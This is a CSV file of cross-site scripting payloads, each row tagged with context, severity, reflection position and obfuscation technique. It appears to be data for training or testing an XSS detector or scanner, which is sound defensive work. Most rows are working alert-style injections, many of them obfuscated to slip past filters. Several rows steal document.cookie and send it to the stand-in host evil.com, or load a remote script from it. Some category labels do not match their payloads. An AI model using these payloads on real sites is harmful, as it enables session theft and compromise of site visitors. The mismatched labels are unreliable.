payload,payload_with_context,context,severity,source,sink,reflection_position,technique
<img src=x onerror=al'+'ert(1)>,<img src=x onerror=al'+'ert(1)> [position:html_body],event_handler,high,,,html_body,obfuscated:concat_split
""" onfocus=alert(1) autofocus=""",""" onfocus=alert(1) autofocus="" [position:attribute]",attribute,medium,,,attribute,obfuscated:url_encode
"<iframe src=""javascript:confirm(1)"">","<iframe src=""javascript:confirm(1)""> [position:style]",template_injection,medium,,,style,mutated
""" onload=alert(1) x=""",""" onload=alert(1) x="" [position:html_body]",script_injection,low,,,html_body,original
"<vIdeO	><sourCe onerror=""['al\u0065'+'rt'][0]['\x63onstructor']['\x63onstructor']('return this')()[['al\u0065'+'rt'][0]]([String.fromCharCode(8238)+[!+[]+!+[]]+[![]+[]][+[]]])"">","<vIdeO	><sourCe onerror=""['al\u0065'+'rt'][0]['\x63onstructor']['\x63onstructor']('return this')()[['al\u0065'+'rt'][0]]([String.fromCharCode(8238)+[!+[]+!+[]]+[![]+[]][+[]]])""> [position:html_body]",html_body,high,,,html_body,mutated
<%= alert(1) %>,<%= alert(1) %> [position:attribute],template_injection,medium,,,attribute,original
javascript:confirm(1),javascript:confirm(1) [position:script],template_injection,medium,,,script,original
#{\u0061\u006cert(1)},#{\u0061\u006cert(1)} [position:attribute],template_injection,medium,,,attribute,obfuscated:unicode_escape
""" onfocus=alert(1) autofocus=""",""" onfocus=alert(1) autofocus="" [position:attribute]",attribute,high,,,attribute,original
""" onfocus=alert(1) autofocus=""",""" onfocus=alert(1) autofocus="" [position:attribute]",attribute,low,,,attribute,mutated
&quot; onload=alert(1) x=&quot;,&quot; onload=alert(1) x=&quot; [position:script],attribute_escape,medium,,,script,mutated
"<object data=""javascript:alert(1)"">","<object data=""javascript:alert(1)""> [position:script]",tag_injection,medium,,,script,original
<img src=x onerror=alert(1)>,<img src=x onerror=alert(1)> [position:html_body],tag_injection,high,,,html_body,original
javascript:alert(document.domain),javascript:alert(document.domain) [position:none],event_handler,low,,,none,original
"\u006coc\u0061tion=""j\u0061v\u0061script:\u0061\u006cert(1)""","\u006coc\u0061tion=""j\u0061v\u0061script:\u0061\u006cert(1)"" [position:html_body]",script_injection,low,,,html_body,obfuscated:unicode_escape
"dAtA:TeXt/hTmL,<sCrIpT>AlErT(1)</ScRiPt>","dAtA:TeXt/hTmL,<sCrIpT>AlErT(1)</ScRiPt> [position:html_body]",js_uri,low,,,html_body,obfuscated:mixed_case
javascript:confirm(1),javascript:confirm(1) [position:html_body],js_uri,high,,,html_body,mutated
' onmouseover=alert(1) ',' onmouseover=alert(1) ' [position:attribute],attribute,medium,,,attribute,original
"<img src
=x onerror
=alert(	1)>","<img src
=x onerror
=alert(	1)> [position:none]",event_handler,low,,,none,obfuscated:tab_newline_inject
"\""><img src=x onerror=alert(1)>","\""><img src=x onerror=alert(1)> [position:html_body]",attribute_escape,medium,,,html_body,original
<svg onload=alert(1)>,<svg onload=alert(1)> [position:none],event_handler,low,,,none,original
"document.body.innerHTML
=""<img src
=x onerror
=alert(	1)>""","document.body.innerHTML
=""<img src
=x onerror
=alert(	1)>"" [position:script]",dom_sink,medium,,,script,obfuscated:tab_newline_inject
<SvG OnLoAd=aLeRt(1)>,<SvG OnLoAd=aLeRt(1)> [position:style],event_handler,high,,,style,obfuscated:mixed_case
"eval(""alert(1)"")","eval(""alert(1)"") [position:attribute]",attribute_escape,high,,,attribute,obfuscated:comment_inject
onerror='alert(1)',onerror='alert(1)' [position:html_body],html_body,medium,,,html_body,none
<select>d.innerHTML+='';</script>,<select>d.innerHTML+='';</script> [position:html_body],html_body,high,,,html_body,mutated
"location=""javascript:alert(1)""","location=""javascript:alert(1)"" [position:script]",dom_sink,low,,,script,mutated
<ImG SrC=X OnErRoR=AlErT(1)>,<ImG SrC=X OnErRoR=AlErT(1)> [position:script],tag_injection,high,,,script,obfuscated:mixed_case
${alert(1)},${alert(1)} [position:attribute],template_injection,medium,,,attribute,original
"location=""javascript:alert(1)""","location=""javascript:alert(1)"" [position:script]",dom_sink,low,,,script,original
"javascript:void(document.location=""http://evil.com"")","javascript:void(document.location=""http://evil.com"") [position:script]",js_uri,low,,,script,original
<svg onload=alert()>,<svg onload=alert()> [position:html_body],html_body,medium,,,html_body,none
${alert(1)},${alert(1)} [position:html_body],template_injection,medium,,,html_body,original
<svg/onload=alert(1)>,<svg/onload=alert(1)> [position:script],tag_injection,medium,,,script,mutated
javascript:confirm(1),javascript:confirm(1) [position:attribute],attribute,low,,,attribute,mutated
' \x3e\x3cimg src=x onerror=alert(1)\x3e,' \x3e\x3cimg src=x onerror=alert(1)\x3e [position:none],js_uri,high,,,none,obfuscated:hex_escape
"setTimeout(""alert(1)"",0)","setTimeout(""alert(1)"",0) [position:none]",dom_sink,medium,,,none,original
"document.write(""<img src=x onload=alert(1)>"")","document.write(""<img src=x onload=alert(1)>"") [position:script]",template_injection,low,,,script,mutated
"&quot; onerror
=alert(	1) x
=&quot;","&quot; onerror
=alert(	1) x
=&quot; [position:attribute]",attribute_escape,medium,,,attribute,obfuscated:tab_newline_inject
<img/src/onerror=alert(1),<img/src/onerror=alert(1) [position:html_body],html_body,medium,,,html_body,none
<img src=x onload=alert(1)>,<img src=x onload=alert(1)> [position:script],tag_injection,medium,,,script,mutated
' onmouseover=alert(1) ',' onmouseover=alert(1) ' [position:attribute],attribute,medium,,,attribute,obfuscated:comment_inject
<script>confirm(document.domain)</script>,<script>confirm(document.domain)</script> [position:script],template_injection,medium,,,script,mutated
javascript:confirm(	1),javascript:confirm(	1) [position:html_body],js_uri,high,,,html_body,obfuscated:tab_newline_inject
onERROR='AlErt(1)',onERROR='AlErt(1)' [position:html_body],html_body,medium,,,html_body,mutated
""" onload=alert(1) x=""",""" onload=alert(1) x="" [position:attribute]",event_handler,medium,,,attribute,obfuscated:html_entity
"\x3cscript\x3edocument.location=""http://evil.com/?c=""+document.cookie\x3c/script\x3e","\x3cscript\x3edocument.location=""http://evil.com/?c=""+document.cookie\x3c/script\x3e [position:script]",script_injection,high,,,script,obfuscated:hex_escape
""" onerror=confirm(1) x=""",""" onerror=confirm(1) x="" [position:html_body]",script_injection,medium,,,html_body,mutated
<img src=x onload=alert(1)>,<img src=x onload=alert(1)> [position:html_body],event_handler,medium,,,html_body,mutated
<%= alert(1) %>,<%= alert(1) %> [position:html_body],template_injection,medium,,,html_body,mutated
"<object data=""javascript:alert(1)"">","<object data=""javascript:alert(1)""> [position:script]",attribute_escape,low,,,script,mutated
<script>confirm(1)</script>,<script>confirm(1)</script> [position:html_body],script_injection,low,,,html_body,mutated
<script src=//evil.com/xss.js></script>,<script src=//evil.com/xss.js></script> [position:html_body],script_injection,high,,,html_body,mutated
javascript:confirm(1),javascript:confirm(1) [position:script],js_uri,high,,,script,obfuscated:html_entity
"""><svg onload=alert(1)>","""><svg onload=alert(1)> [position:dom]",html_body,medium,,,dom,none
<svg onload=alert()>,<svg onload=alert()> [position:attribute],html_body,medium,,,attribute,none
"""\x3e\x3cimg src=x onerror=alert(1)\x3e","""\x3e\x3cimg src=x onerror=alert(1)\x3e [position:attribute]",attribute,high,,,attribute,obfuscated:hex_escape
"data:text/html,<script>alert(1)</script>","data:text/html,<script>alert(1)</script> [position:script]",template_injection,low,,,script,mutated
</tag><svg onload=alert(1)>,</tag><svg onload=alert(1)> [position:comment],attribute,medium,,,comment,none
"\"" onload=alert(1)//","\"" onload=alert(1)// [position:none]",dom_sink,low,,,none,mutated
{{7*7}},{{7*7}} [position:attribute],js_uri,high,,,attribute,mutated
"\""><iMg sRc=x oNeRrOr=aLeRt(1)>","\""><iMg sRc=x oNeRrOr=aLeRt(1)> [position:script]",attribute_escape,medium,,,script,obfuscated:mixed_case
"<script>document.location=""http://evil.com/?c=""+document.cookie</script>","<script>document.location=""http://evil.com/?c=""+document.cookie</script> [position:html_body]",script_injection,medium,,,html_body,original
' ><img src=x onerror=alert(1)>,' ><img src=x onerror=alert(1)> [position:attribute],js_uri,medium,,,attribute,original
<video src=x onerror=alert(1)>,<video src=x onerror=alert(1)> [position:script],event_handler,low,,,script,original
"<embed src=""javascript:alert(1)"">","<embed src=""javascript:alert(1)""> [position:html_body]",script_injection,high,,,html_body,original
<video src=x onerror=alert(1)>,<video src=x onerror=alert(1)> [position:html_body],event_handler,medium,,,html_body,original
' onerror=alert(1) x=',' onerror=alert(1) x=' [position:attribute],attribute,high,,,attribute,original
""" onerror
=alert(	1) x
=""",""" onerror
=alert(	1) x
="" [position:attribute]",attribute,low,,,attribute,obfuscated:tab_newline_inject
<svg src=x onerror=alert(1)>,<svg src=x onerror=alert(1)> [position:html_body],tag_injection,high,,,html_body,mutated
"""><img src=x onerror=alert(1)>","""><img src=x onerror=alert(1)> [position:script]",script_injection,high,,,script,original
onload='alert(1)',onload='alert(1)' [position:html_body],html_body,medium,,,html_body,none
"data:text/html,<script>alert(1)</script>","data:text/html,<script>alert(1)</script> [position:html_body]",js_uri,high,,,html_body,mutated
' onerror=alert(1) x=',' onerror=alert(1) x=' [position:attribute],attribute,low,,,attribute,original
javascript:alert(1),javascript:alert(1) [position:script],js_uri,low,,,script,original
javascript:alert(1),javascript:alert(1) [position:script],js_uri,medium,,,script,mutated
"javascript:void(document.location=""http://evil.com"")","javascript:void(document.location=""http://evil.com"") [position:html_body]",js_uri,high,,,html_body,original
' onmouseover=alert(1) ',' onmouseover=alert(1) ' [position:attribute],attribute,medium,,,attribute,original
<%= \u0061\u006cert(1) %>,<%= \u0061\u006cert(1) %> [position:html_body],template_injection,high,,,html_body,obfuscated:unicode_escape
onload='self.alert(1)',onload='self.alert(1)' [position:html_body],html_body,medium,,,html_body,mutated
<script>alert(1)</script>,<script>alert(1)</script> [position:script],script_injection,medium,,,script,original
<input onfocus=alert(1) autofocus>,<input onfocus=alert(1) autofocus> [position:script],event_handler,medium,,,script,mutated
<body onload=alert(1)>,<body onload=alert(1)> [position:html_body],event_handler,medium,,,html_body,original
javascript:alert(1),javascript:alert(1) [position:style],js_uri,high,,,style,original
<%= alert(1) %>,<%= alert(1) %> [position:attribute],template_injection,medium,,,attribute,original
"javascript:void(document.location=""http://evil.com"")","javascript:void(document.location=""http://evil.com"") [position:style]",js_uri,medium,,,style,original
"\""><img src=x onerror=alert(1)>","\""><img src=x onerror=alert(1)> [position:none]",attribute_escape,medium,,,none,original
<img src=x onerror=alert(1)>,<img src=x onerror=alert(1)> [position:style],event_handler,high,,,style,mutated
<video src=x onerror=alert(1)>,<video src=x onerror=alert(1)> [position:script],event_handler,medium,,,script,original
"<embed src=""javaSCRIPT:alert(1)"">","<embed src=""javaSCRIPT:alert(1)""> [position:script]",script_injection,medium,,,script,mutated
<image src/onerror=alert(1)>,<image src/onerror=alert(1)> [position:dom],html_body,medium,,,dom,none
javascript:confirm(1),javascript:confirm(1) [position:attribute],js_uri,medium,,,attribute,mutated
""" onload=alert(1) x=""",""" onload=alert(1) x="" [position:script]",tag_injection,high,,,script,mutated
""" onload=alert(1) x=""",""" onload=alert(1) x="" [position:style]",event_handler,low,,,style,obfuscated:comment_inject
"onerror=""alert(1)""","onerror=""alert(1)"" [position:html_body]",html_body,medium,,,html_body,none
<SvG/OnLoAd=aLeRt(1)>,<SvG/OnLoAd=aLeRt(1)> [position:script],tag_injection,low,,,script,obfuscated:mixed_case
"\""><img src=x onload=alert(1)>","\""><img src=x onload=alert(1)> [position:attribute]",attribute_escape,high,,,attribute,mutated
"location=""javascript:alert(1)""","location=""javascript:alert(1)"" [position:none]",dom_sink,low,,,none,original
&quot; onerror=alert(1) x=&quot;,&quot; onerror=alert(1) x=&quot; [position:script],script_injection,low,,,script,original
&quot; onerror=alert(1) x=&quot;,&quot; onerror=alert(1) x=&quot; [position:none],attribute_escape,low,,,none,mutated
\x3cimg/src=x onerror=alert(1)//\x3e,\x3cimg/src=x onerror=alert(1)//\x3e [position:style],event_handler,high,,,style,obfuscated:hex_escape
<svg onload=alert(1)>,<svg onload=alert(1)> [position:none],event_handler,medium,,,none,original
javascript:alert(1),javascript:alert(1) [position:attribute],attribute,high,,,attribute,original
<script>confirm(1)</script>,<script>confirm(1)</script> [position:html_body],script_injection,medium,,,html_body,original
"\""><img src=x onerror=alert(1)>","\""><img src=x onerror=alert(1)> [position:attribute]",attribute_escape,low,,,attribute,original
<body onload=alert(1)>,<body onload=alert(1)> [position:style],event_handler,high,,,style,original
<table/onload=alert(0);>,<table/onload=alert(0);> [position:html_body],html_body,medium,,,html_body,mutated
' onmouseover=alert(1) ',' onmouseover=alert(1) ' [position:attribute],attribute,low,,,attribute,original
<img src=x onerror=\u0061\u006cert(1)>,<img src=x onerror=\u0061\u006cert(1)> [position:attribute],event_handler,medium,,,attribute,obfuscated:unicode_escape
\x3cscript src=//evil.com/xss.js\x3e\x3c/script\x3e,\x3cscript src=//evil.com/xss.js\x3e\x3c/script\x3e [position:attribute],attribute,medium,,,attribute,obfuscated:hex_escape
"<embed src=""javascript:alert(1)"">","<embed src=""javascript:alert(1)""> [position:html_body]",tag_injection,medium,,,html_body,original
<script>confirm(1)</script>,<script>confirm(1)</script> [position:script],script_injection,high,,,script,mutated
<script>confirm(1)</script>,<script>confirm(1)</script> [position:attribute],event_handler,medium,,,attribute,mutated
"setTimeout(""alert(1)"",0)","setTimeout(""alert(1)"",0) [position:none]",dom_sink,medium,,,none,mutated
<script>confirm(1)</script>,<script>confirm(1)</script> [position:html_body],script_injection,high,,,html_body,mutated
<script>alert(1)</script>,<script>alert(1)</script> [position:html_body],script_injection,high,,,html_body,original
"<script>document.location=""http://evil.com/?c=""+document.cookie</script>","<script>document.location=""http://evil.com/?c=""+document.cookie</script> [position:html_body]",script_injection,low,,,html_body,original
<svg src=x onerror=alert(1)>,<svg src=x onerror=alert(1)> [position:none],dom_sink,low,,,none,mutated
"eval(""alert(1)"")","eval(""alert(1)"") [position:script]",dom_sink,medium,,,script,original
<script>prompt(1)</script>,<script>prompt(1)</script> [position:script],script_injection,high,,,script,original
"document.write(""&lt;img src=x onerror=alert(1)&gt;"")","document.write(""&lt;img src=x onerror=alert(1)&gt;"") [position:style]",attribute_escape,low,,,style,obfuscated:html_entity
